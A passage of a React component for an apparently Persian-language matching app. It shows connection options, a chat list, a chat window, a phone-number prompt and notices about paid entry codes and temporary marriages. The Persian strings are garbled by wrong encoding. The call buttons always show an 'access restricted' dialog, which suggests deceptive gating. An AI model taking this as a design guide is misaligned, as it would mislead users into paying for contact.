            </button>
          </div>
        </div>

        <TabBar />
      </div>
    );
  }

  if (showConnectionOptions && selectedCase) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-pink-50 via-rose-50 to-purple-100">
        <NavBar title={selectedCase.name.split(' - ')[0]} showBack={true} />

        <div className="pt-20 pb-20 px-4">
          <div className="bg-white/95 backdrop-blur-sm rounded-3xl p-6 shadow-xl mb-6">
            <div className="flex items-center mb-6">
              <img 
                src={selectedCase.image}
                alt={selectedCase.name}
                className="w-20 h-20 rounded-2xl object-cover shadow-lg mr-4"
              />
              <div className="flex-1">
                <h3 className="font-bold text-gray-800 text-xl">{selectedCase.name}</h3>
                <p className="text-gray-600 text-sm mb-1">{selectedCase.location}</p>
                <div className="flex items-center">
                  <div className="w-3 h-3 bg-green-500 rounded-full mr-2"></div>
                  <span className="text-green-600 text-sm font-medium">ÿ¢ŸÜŸÑÿß€åŸÜ</span>
                </div>
              </div>
            </div>

            <p className="text-gray-700 leading-relaxed text-sm mb-6">
              {selectedCase.description}
            </p>
          </div>

          <div className="space-y-4">
            <div className="bg-white/95 backdrop-blur-sm rounded-3xl p-6 shadow-xl">
              <h3 className="font-bold text-gray-800 text-lg mb-4 text-center">
                ŸÜÿ≠ŸàŸá ÿßÿ±ÿ™ÿ®ÿßÿ∑ ÿ±ÿß ÿßŸÜÿ™ÿÆÿßÿ® ⁄©ŸÜ€åÿØ
              </h3>

              <div className="grid grid-cols-1 gap-4">
                <button
                  onClick={handleChatCodeEntry}
                  className="bg-gradient-to-r from-pink-500 to-rose-600 hover:from-pink-600 hover:to-rose-700 text-white font-bold py-4 px-6 rounded-2xl shadow-lg transition-all duration-300 hover:scale-105"
                >
                  <div className="flex items-center justify-center">
                    <i className="ri-chat-3-line mr-3 text-xl"></i>
                    <div>
                      <div className="text-lg">⁄Üÿ™</div>
                      <div className="text-xs opacity-90">ŸÜ€åÿßÿ≤ ÿ®Ÿá ⁄©ÿØ Ÿàÿ±ŸàÿØ</div>
                    </div>
                  </div>
                </button>

                <button
                  onClick={handleChatCodeEntry}
                  className="bg-gradient-to-r from-green-500 to-emerald-600 hover:from-green-600 hover:to-emerald-700 text-white font-bold py-4 px-6 rounded-2xl shadow-lg transition-all duration-300 hover:scale-105"
                >
                  <div className="flex items-center justify-center">
                    <i className="ri-phone-fill mr-3 text-xl"></i>
                    <div>
                      <div className="text-lg">ÿ™ŸÖÿßÿ≥ ÿµŸàÿ™€å</div>
                      <div className="text-xs opacity-90">ŸÜ€åÿßÿ≤ ÿ®Ÿá ⁄©ÿØ Ÿàÿ±ŸàÿØ</div>
                    </div>
                  </div>
                </button>

                <button
                  onClick={handleChatCodeEntry}
                  className="bg-gradient-to-r from-blue-500 to-cyan-600 hover:from-blue-600 hover:to-cyan-700 text-white font-bold py-4 px-6 rounded-2xl shadow-lg transition-all duration-300 hover:scale-105"
                >
                  <div className="flex items-center justify-center">
                    <i className="ri-vidicon-fill mr-3 text-xl"></i>
                    <div>
                      <div className="text-lg">ÿ™ŸÖÿßÿ≥ ÿ™ÿµŸà€åÿ±€å</div>
                      <div className="text-xs opacity-90">ŸÜ€åÿßÿ≤ ÿ®Ÿá ⁄©ÿØ Ÿàÿ±ŸàÿØ</div>
                    </div>
                  </div>
                </button>
              </div>

              <div className="mt-6 p-4 bg-yellow-50 rounded-2xl border border-yellow-200">
                <div className="flex items-start">
                  <i className="ri-information-line text-yellow-600 text-lg ml-2 mt-0.5"></i>
                  <div className="text-yellow-800 text-sm">
                    <p className="font-semibold mb-1">ŸÜÿ≠ŸàŸá ÿØÿ±€åÿßŸÅÿ™ ⁄©ÿØ Ÿàÿ±ŸàÿØ:</p>
                    <p>ÿ®ÿ±ÿß€å ÿØÿ±€åÿßŸÅÿ™ ⁄©ÿØ Ÿàÿ±ŸàÿØÿå ÿßÿ®ÿ™ÿØÿß ÿ®ÿß€åÿØ ÿØÿ±ÿÆŸàÿßÿ≥ÿ™ ÿßÿ±ÿ™ÿ®ÿßÿ∑ ÿÆŸàÿØ ÿ±ÿß ÿ´ÿ®ÿ™ Ÿà Ÿáÿ≤€åŸÜŸá ŸÖÿ±ÿ®Ÿàÿ∑Ÿá ÿ±ÿß Ÿæÿ±ÿØÿßÿÆÿ™ ⁄©ŸÜ€åÿØ</p>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <button
            onClick={backToChatList}
            className="w-full mt-6 bg-gray-500 hover:bg-gray-600 text-white font-semibold py-3 px-6 rounded-2xl transition-colors"
          >
            ÿ®ÿßÿ≤⁄Øÿ¥ÿ™ ÿ®Ÿá ŸÑ€åÿ≥ÿ™ ⁄Üÿ™‚ÄåŸáÿß
          </button>
        </div>

        <TabBar />
      </div>
    );
  }

  if (showChatList) {
    return (
      <div className="min-h-screen bg-gradient-to-br from-blue-50 via-indigo-50 to-purple-100">
        <NavBar title="⁄Üÿ™‚ÄåŸáÿß€å ŸÖŸÜ" showBack={true} />

        <div className="pt-20 pb-20">
          <div className="px-4 mb-4">
            <div className="bg-gradient-to-r from-green-50 to-emerald-50 border border-green-200 rounded-2xl p-4">
              <div className="flex items-center justify-center">
                <i className="ri-database-2-line text-green-600 mr-2"></i>
                <span className="text-green-700 font-medium text-sm">
                  üí¨ {chatRooms.length} ⁄Üÿ™ ŸÅÿπÿßŸÑ (ŸáŸÖ⁄ØÿßŸÖ‚Äåÿ≥ÿßÿ≤€å ÿ¥ÿØŸá ÿ®ÿß ÿØ€åÿ™ÿßÿ®€åÿ≥)
                </span>
              </div>
            </div>
          </div>

          {isInActiveChat && (
            <div className="px-4 mb-4">
              <div className="bg-gradient-to-r from-pink-50 to-rose-50 border border-pink-200 rounded-2xl p-4">
                <div className="flex items-center justify-between">
                  <div className="flex items-center">
                    <i className="ri-chat-3-fill text-pink-600 text-xl mr-2"></i>
                    <span className="text-pink-700 font-medium text-sm">
                      ⁄Üÿ™ ŸÅÿπÿßŸÑ ÿØÿßÿ±€åÿØ - ÿ®ÿ±ÿß€å ÿßÿØÿßŸÖŸá ⁄©ŸÑ€å⁄© ⁄©ŸÜ€åÿØ
                    </span>
                  </div>
                  <button
                    onClick={() => {
                      setShowChatList(false);
                      setIsInActiveChat(true);
                    }}
                    className="bg-gradient-to-r from-pink-500 to-rose-600 text-white px-3 py-1 rounded-xl text-xs font-semibold"
                  >
                    ÿßÿØÿßŸÖŸá ⁄Üÿ™
                  </button>
                </div>
              </div>
            </div>
          )}

          {chatRooms.length === 0 ? (
            <div className="px-4 py-8 text-center">
              <div className="bg-white/95 backdrop-blur-sm rounded-3xl p-8 shadow-xl">
                <div className="w-24 h-24 mx-auto mb-6 bg-gray-100 rounded-full flex items-center justify-center">
                  <i className="ri-chat-3-line text-4xl text-gray-400"></i>
                </div>
                <h3 className="text-xl font-bold text-gray-800 mb-3">ŸáŸÜŸàÿ≤ ⁄Üÿ™€å ŸÜÿØÿßÿ±€åÿØ</h3>
                <p className="text-gray-600 mb-6 leading-relaxed">
                  ÿ®ÿ±ÿß€å ÿ¥ÿ±Ÿàÿπ ⁄Üÿ™ÿå ÿßÿ®ÿ™ÿØÿß ⁄©€åÿ≥ ŸÖŸàÿ±ÿØ ŸÜÿ∏ÿ± ÿÆŸàÿØ ÿ±ÿß ÿßŸÜÿ™ÿÆÿßÿ® ⁄©ŸÜ€åÿØ
                </p>
                <button
                  onClick={() => navigate('/services')}
                  className="bg-gradient-to-r from-pink-500 to-rose-600 hover:from-pink-600 hover:to-rose-700 text-white font-bold py-3 px-6 rounded-2xl shadow-lg transition-all duration-300"
                >
                  <i className="ri-search-line mr-2"></i>
                  ŸÖÿ¥ÿßŸáÿØŸá ⁄©€åÿ≥‚ÄåŸáÿß
                </button>
              </div>
            </div>
          ) : (
            <div className="px-4">
              <div className="mb-4">
                <h2 className="text-lg font-bold text-gray-800 mb-2">⁄Üÿ™‚ÄåŸáÿß€å ŸÅÿπÿßŸÑ ({chatRooms.length})</h2>
                <p className="text-gray-600 text-sm">ÿ±Ÿà€å Ÿáÿ± ⁄Üÿ™ ⁄©ŸÑ€å⁄© ⁄©ŸÜ€åÿØ ÿ™ÿß Ÿàÿßÿ±ÿØ ÿ¥Ÿà€åÿØ</p>
              </div>

              <div className="space-y-3">
                {chatRooms.map((room) => (
                  <div
                    key={room.id}
                    className="bg-white/95 backdrop-blur-sm rounded-3xl shadow-xl border border-white/30 overflow-hidden"
                  >
                    <div className="p-4">
                      <div className="flex items-center">
                        <div className="relative">
                          <img 
                            src={room.caseData.image}
                            alt={room.caseData.name}
                            className="w-16 h-16 rounded-2xl object-cover shadow-lg"
                          />
                          <div className="absolute -bottom-1 -right-1 w-5 h-5 bg-green-500 rounded-full border-2 border-white"></div>
                        </div>
                        
                        <div className="flex-1 mr-4">
                          <div className="flex items-center justify-between mb-1">
                            <h3 className="font-bold text-gray-800">{room.caseData.name}</h3>
                            {room.unreadCount > 0 && (
                              <div className="bg-red-500 text-white text-xs font-bold px-2 py-1 rounded-full min-w-[20px] text-center">
                                {room.unreadCount}
                              </div>
                            )}
                          </div>
                          <p className="text-gray-600 text-sm mb-1">{room.caseData.location}</p>
                          <p className="text-gray-500 text-xs truncate">
                            {room.lastMessage || 'ŸáŸÜŸàÿ≤ Ÿæ€åÿßŸÖ€å ÿßÿ±ÿ≥ÿßŸÑ ŸÜÿ¥ÿØŸá'}
                          </p>
                        </div>
                      </div>

                      <div className="flex items-center justify-between mt-4 pt-3 border-t border-gray-100">
                        <button
                          onClick={() => openChatRoom(room.caseData)}
                          className="flex-1 bg-gradient-to-r from-pink-500 to-rose-600 hover:from-pink-600 hover:to-rose-700 text-white font-semibold py-2 px-4 rounded-xl text-sm transition-all duration-300 ml-2"
                        >
                          <i className="ri-chat-3-line mr-1"></i>
                          ⁄Üÿ™
                        </button>
                        
                        <button
                          onClick={() => removeChatRoom(room.id)}
                          className="bg-gray-100 hover:bg-red-100 text-gray-600 hover:text-red-600 p-2 rounded-xl transition-colors"
                        >
                          <i className="ri-delete-bin-line"></i>
                        </button>
                      </div>
                    </div>
                  </div>
                ))}
              </div>
            </div>
          )}
        </div>

        <TabBar />
      </div>
    );
  }

  return (
    <div className="min-h-screen bg-gradient-to-br from-pink-50 via-rose-50 to-purple-100 flex flex-col">
      <div className="bg-white/95 backdrop-blur-lg shadow-lg border-b border-pink-100">
        <div className="flex items-center justify-between p-4 pt-12">
          <button 
            onClick={backToChatList}
            className="w-10 h-10 flex items-center justify-center rounded-full text-gray-600 hover:bg-gray-100 transition-colors"
          >
            <i className="ri-arrow-right-line text-xl"></i>
          </button>

          {userProfile && (
            <div className="flex items-center flex-1 mx-4">
              <div className="relative">
                <img 
                  src={userProfile.avatar}
                  alt={userProfile.name}
                  className="w-12 h-12 rounded-full object-cover shadow-lg"
                />
                <div className={`absolute -bottom-1 -right-1 w-4 h-4 rounded-full border-2 border-white ${userProfile.isOnline ? 'bg-green-500' : 'bg-gray-400'}`}></div>
              </div>
              <div className="mr-3 flex-1">
                <h3 className="font-bold text-gray-800 flex items-center">
                  {userProfile.name}
                  {userProfile.verified && <i className="ri-verified-badge-fill text-blue-500 mr-1 text-sm"></i>}
                </h3>
                <p className="text-xs text-gray-600">{userProfile.lastSeen}</p>
              </div>
            </div>
          )}

          <div className="flex items-center space-x-2 rtl:space-x-reverse">
            <button 
              onClick={() => setShowAccessDenied(true)}
              className="w-10 h-10 flex items-center justify-center rounded-full bg-green-100 text-green-600 hover:bg-green-200 transition-colors"
            >
              <i className="ri-phone-fill text-lg"></i>
            </button>
            <button 
              onClick={() => setShowAccessDenied(true)}
              className="w-10 h-10 flex items-center justify-center rounded-full bg-blue-100 text-blue-600 hover:bg-blue-200 transition-colors"
            >
              <i className="ri-vidicon-fill text-lg"></i>
            </button>
            <button 
              onClick={exitActiveChatCompletely}
              className="w-10 h-10 flex items-center justify-center rounded-full bg-red-100 text-red-600 hover:bg-red-200 transition-colors"
              title="Ÿæÿß€åÿßŸÜ ⁄Üÿ™ ŸÅÿπÿßŸÑ"
            >
              <i className="ri-close-line text-lg"></i>
            </button>
          </div>
        </div>
      </div>

      <div className="flex-1 overflow-y-auto px-4 py-4">
        <div className="space-y-4">
          {messages.map((message) => {
            const messageTimestamp = new Date(message.timestamp);
            
            return (
              <div
                key={message.id}
                className={`flex ${message.isUser ? 'justify-start' : 'justify-end'}`}
              >
                <div className={`max-w-[75%] ${message.isUser ? 'order-2' : 'order-1'}`}>
                  <div
                    className={`px-4 py-3 rounded-2xl shadow-lg relative ${
                      message.isUser
                        ? 'bg-gradient-to-r from-pink-500 to-rose-600 text-white rounded-br-md'
                        : message.type === 'system'
                        ? 'bg-gradient-to-r from-blue-500 to-indigo-600 text-white rounded-bl-md'
                        : 'bg-white text-gray-800 rounded-bl-md border border-gray-100'
                    }`}
                  >
                    <p className="text-sm leading-relaxed">
                      {message.text}
                    </p>
                  </div>
                  <p className="text-xs text-gray-500 mt-1 px-2">
                    {messageTimestamp.toLocaleTimeString('fa-IR', {
                      hour: '2-digit',
                      minute: '2-digit'
                    })}
                  </p>
                </div>
                
                <div className={`w-10 h-10 rounded-full flex items-center justify-center flex-shrink-0 ${
                  message.isUser ? 'order-1 mr-2' : 'order-2 ml-2'
                }`}>
                  {message.isUser ? (
                    <div className="w-10 h-10 bg-pink-100 rounded-full flex items-center justify-center">
                      <i className="ri-user-3-fill text-pink-600 text-lg"></i>
                    </div>
                  ) : message.type === 'system' ? (
                    <div className="w-10 h-10 bg-blue-100 rounded-full flex items-center justify-center">
                      <i className="ri-settings-4-fill text-blue-600 text-lg"></i>
                    </div>
                  ) : (
                    <img 
                      src={userProfile?.avatar}
                      alt={userProfile?.name}
                      className="w-10 h-10 rounded-full object-cover shadow-lg"
                    />
                  )}
                </div>
              </div>
            );
          })}

          {isTyping && (
            <div className="flex justify-end">
              <div className="max-w-[75%] order-1">
                <div className="bg-white text-gray-800 px-4 py-3 rounded-2xl rounded-bl-md shadow-lg border border-gray-100">
                  <div className="flex space-x-1 rtl:space-x-reverse justify-center">
                    <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce"></div>
                    <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce" style={{animationDelay: '0.1s'}}></div>
                    <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce" style={{animationDelay: '0.2s'}}></div>
                  </div>
                </div>
              </div>
              <div className="w-10 h-10 rounded-full flex items-center justify-center flex-shrink-0 order-2 ml-2">
                <img 
                  src={userProfile?.avatar}
                  alt={userProfile?.name}
                  className="w-10 h-10 rounded-full object-cover shadow-lg"
                />
              </div>
            </div>
          )}
          
          <div ref={messagesEndRef} />
        </div>
      </div>

      {showPhoneInput && (
        <div className="bg-gradient-to-r from-blue-50 to-indigo-50 border-t border-blue-200 p-4">
          <div className="max-w-md mx-auto">
            <label className="block text-blue-800 text-sm font-semibold mb-3">ÿ¥ŸÖÿßÿ±Ÿá ÿ™ŸÖÿßÿ≥ ÿ¨Ÿáÿ™ ŸáŸÖÿßŸáŸÜ⁄Ø€å:</label>
            <div className="flex space-x-3 rtl:space-x-reverse">
              <input
                type="tel"
                value={phoneNumber}
                onChange={(e) => setPhoneNumber(e.target.value)}
                placeholder="09xxxxxxxxx"
                className="flex-1 bg-white border border-blue-300 rounded-xl px-4 py-3 focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm"
                maxLength={11}
              />
              <button
                onClick={handlePhoneSubmit}
                className="bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 text-white px-6 py-3 rounded-xl font-semibold transition-all duration-300"
              >
                ÿßÿ±ÿ≥ÿßŸÑ
              </button>
            </div>
          </div>
        </div>
      )}

      {showFinalNotice && (
        <div className="bg-gradient-to-r from-orange-50 to-red-50 border-t border-orange-200 p-6">
          <div className="bg-white rounded-2xl p-6 shadow-lg">
            <div className="text-center mb-4">
              <div className="w-16 h-16 bg-gradient-to-r from-orange-500 to-red-600 rounded-full flex items-center justify-center mx-auto mb-4">
                <i className="ri-information-line text-white text-2xl"></i>
              </div>
              <h3 className="font-bold text-gray-800 text-lg mb-2">‚ö†Ô∏è ÿ™Ÿàÿ¨Ÿá ŸÖŸáŸÖ</h3>
            </div>
            
            <div className="space-y-4 text-sm text-gray-700 leading-relaxed">
              <p className="bg-yellow-50 border border-yellow-200 rounded-xl p-4">
                <strong>ŸáŸÖÿßŸáŸÜ⁄Ø€å ŸÖŸÖ⁄©ŸÜŸá ÿ®€åŸÜ €≤ ÿßŸÑ€å €≤€¥ ÿ≥ÿßÿπÿ™ ÿ≤ŸÖÿßŸÜ‚Äåÿ®ÿ± ÿ®ÿßÿ¥ÿØ.</strong> ÿØÿ± ŸÜÿ∏ÿ± ÿØÿßÿ¥ÿ™Ÿá ÿ®ÿßÿ¥€åÿØ ÿßÿ±ÿ™ÿ®ÿßÿ∑ ÿ¥ŸÖÿß ÿ®ÿß ⁄©€åÿ≥ ŸÖŸàÿ±ÿØ ŸÜÿ∏ÿ± ⁄©ÿßŸÖŸÑÿßŸã ÿ±ÿß€å⁄ØÿßŸÜ Ÿáÿ≥ÿ™ Ÿà Ÿæÿ±ÿØÿßÿÆÿ™€å‚ÄåŸáÿß ÿ®ÿß€åÿØ ÿ®Ÿá ÿµŸàÿ±ÿ™ ÿ≠ÿ∂Ÿàÿ±€å Ÿæÿ±ÿØÿßÿÆÿ™ ÿ¥ŸàÿØ.
              </p>
              
              <p className="bg-red-50 border border-red-200 rounded-xl p-4">
                <strong>‚õî ÿØÿ± ÿµŸàÿ±ÿ™ ŸáŸÖÿßŸáŸÜ⁄Ø€å ÿ™ÿß ŸÇÿ®ŸÑ ÿßÿ≤ ÿØ€åÿØÿßÿ± ÿ™ÿ≠ÿ™ Ÿá€å⁄Ü ÿπŸÜŸàÿßŸÜ Ÿáÿ≤€åŸÜŸá‚Äåÿß€å ÿ±ÿØ Ÿà ÿ®ÿØŸÑ ŸÜÿ¥ŸàÿØ.</strong>
              </p>
              
              <p className="bg-blue-50 border border-blue-200 rounded-xl p-4">
                ÿØÿ± ŸÜÿ∏ÿ± ÿØÿßÿ¥ÿ™Ÿá ÿ®ÿßÿ¥€åÿØ ÿß€åŸÜ ŸÖŸàÿ±ÿØ ÿ®ÿ±ÿß€å ÿ±ÿßÿ®ÿ∑Ÿá‚ÄåŸáÿß€å ŸÖŸàŸÇÿ™ (ÿµ€åÿ∫Ÿá) ⁄ØŸÅÿ™Ÿá ÿ¥ÿØŸá. ⁄©ÿßÿ±ÿ®ÿ±ÿßŸÜ –º—ã ÿ™ÿß€å€åÿØ ÿ¥ÿØŸÜÿØ ÿßŸÖÿß ÿ∑ÿ®ŸÇ ŸÇÿ±ÿßÿ±ÿØÿßÿØ ÿ∑ÿ±ŸÅ€åŸÜÿå <strong>ÿ™ŸÖÿßŸÖ€å Ÿæÿ±ÿØÿßÿÆÿ™‚ÄåŸáÿß ÿ®ÿß€åÿØ ÿµŸàÿ±ÿ™ ÿ≠ÿ∂Ÿàÿ±€å ÿßŸÜÿ¨ÿßŸÖ ÿ¥ŸàÿØ.</strong>
              </p>
            </div>
            
            <div className="text-center mt-6 pt-4 border-t border-gray-200">
              <p className="text-gray-600 text-sm font-medium">ÿ®ÿß ÿ≥Ÿæÿßÿ≥ üôè</p>
            </div>
          </div>
        </div>
      )}

      {showAccessDenied && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50 p-4">
          <div className="bg-white rounded-3xl p-6 w-full max-w-sm text-center">
            <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-4">
              <i className="ri-lock-line text-red-500 text-2xl"></i>
            </div>
            <h3 className="font-bold text-gray-800 text-lg mb-2">ÿØÿ≥ÿ™ÿ±ÿ≥€å ŸÖÿ≠ÿØŸàÿØ ÿ¥ÿØŸá</h3>
            <p className="text-gray-600 text-sm mb-6 leading-relaxed">
              ⁄©€åÿ≥ ŸÖŸàÿ±ÿØ ŸÜÿ∏ÿ± ÿØÿ±ÿÆŸàÿßÿ≥ÿ™ ÿßÿ±ÿ™ÿ®ÿßÿ∑ ÿ®ÿß ÿ¥ŸÖÿß ÿ±ÿß ŸáŸÜŸàÿ≤ ÿ™ÿß€å€åÿØ ŸÜ⁄©ÿ±ÿØŸá ÿßÿ≥ÿ™
            </p>
            <button 
              onClick={() => setShowAccessDenied(false)}
              className="w-full bg-red-500 hover:bg-red-600 text-white py-3 px-4 rounded-2xl transition-colors"
            >
              ŸÖÿ™Ÿàÿ¨Ÿá ÿ¥ÿØŸÖ
            </button>
          </div>
        </div>
      )}

      {!showPhoneInput && !showFinalNotice && (
        <div className="bg-white/95 backdrop-blur-lg border-t border-gray-200 p-4 pb-20">
          <div className="flex items-end space-x-3 rtl:space-x-reverse">
            <div className="flex-1 relative">
              <textarea
                value={inputText}
                onChange={(e) => setInputText(e.target.value)}
                onKeyPress={handleKeyPress}
                placeholder="Ÿæ€åÿßŸÖ ÿÆŸàÿØ ÿ±ÿß ÿ®ŸÜŸà€åÿ≥€åÿØ..."
                rows={1}
                className="w-full bg-gray-100 border-none rounded-2xl py-3 px-4 text-sm focus:outline-none focus:ring-2 focus:ring-pink-500 resize-none max-h-24"
                style={{ minHeight: '48px' }}
                disabled={chatClosed}
              />
            </div>
            
            <button
              onClick={() => sendMessage()}
              disabled={!inputText.trim() || chatClosed}
              className={`w-12 h-12 rounded-full flex items-center justify-center transition-all ${
                inputText.trim() && !chatClosed
                  ? 'bg-gradient-to-r from-pink-500 to-rose-600 hover:from-pink-600 hover:to-rose-700 text-white shadow-lg scale-100'
                  : 'bg-gray-200 text-gray-400 scale-95'
              }`}
            >
              <i className="ri-send-plane-fill text-xl"></i>
            </button>
          </div>
        </div>
      )}

      <TabBar />
    </div>
  );
}